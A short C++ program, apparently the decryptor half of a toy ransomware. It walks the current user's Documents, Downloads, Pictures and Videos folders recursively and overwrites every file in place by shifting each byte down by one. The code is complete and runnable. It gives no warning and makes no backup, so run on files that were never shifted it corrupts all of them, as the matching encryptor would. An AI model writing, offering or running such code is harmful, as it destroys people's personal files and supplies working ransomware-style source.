#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

using namespace std;
void fileDecrypt(string filePath){
    fstream file,tmpFile;
    string tmpFilePath = "temp.txt";
    
    file.open(filePath, ios::in);
    tmpFile.open(tmpFilePath, ios::out);

    char byte;
    while(file >> noskipws >> byte){
        byte -= 1;
        tmpFile << byte; 
    }
    file.close();
    tmpFile.close();

    file.open(filePath, ios::out);
    tmpFile.open(tmpFilePath, ios::in);
    while(tmpFile >> noskipws >> byte){
        file << byte; 
    }
    file.close();
    tmpFile.close();
    remove(tmpFilePath.c_str());
}


void dirDecrypt(string dirPath)
{
    DIR* dir;
    struct dirent* entry;
    struct stat status;
    string path;

    if((dir = opendir(dirPath.c_str())) != NULL){
        while((entry = readdir(dir)) != NULL){
            if(strcmp(entry -> d_name, ".") != 0 && strcmp(entry -> d_name, "..") != 0){
                path = dirPath+ "/" + entry -> d_name; //varia de acuerdo con el OS
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)){
                    dirDecrypt(path);
                }
                else
                {
                    fileDecrypt(path);
                }
            }
        }
    }
}

int main(){
    string username = getenv("LOGNAME");
    dirDecrypt("/home/" + username + "/Documents/");
    dirDecrypt("/home/" + username + "/Downloads/");
    dirDecrypt("/home/" + username + "/Pictures/");
    dirDecrypt("/home/" + username + "/Videos/");
    return 0;
}
